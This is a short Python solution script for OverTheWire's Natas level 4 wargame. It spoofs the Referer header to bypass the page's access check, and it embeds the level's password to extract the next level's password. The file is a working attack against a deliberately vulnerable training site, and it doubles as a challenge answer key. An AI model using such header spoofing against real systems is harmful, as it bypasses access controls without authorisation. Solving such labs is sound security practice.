# Vulnerability: Referer Header Manipulation

import requests
import re
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'


# Including Referer header to tell the server that the request originates from the natas5 page
header = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Make a GET request to the URL with basic authentication using the provided credentials
resp = requests.get(url=url, auth=(username, password), headers=header)


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')


# Extract password for the next level using Regular Expressions
print(re.findall('Access granted. (.*)', resp.text)[0])
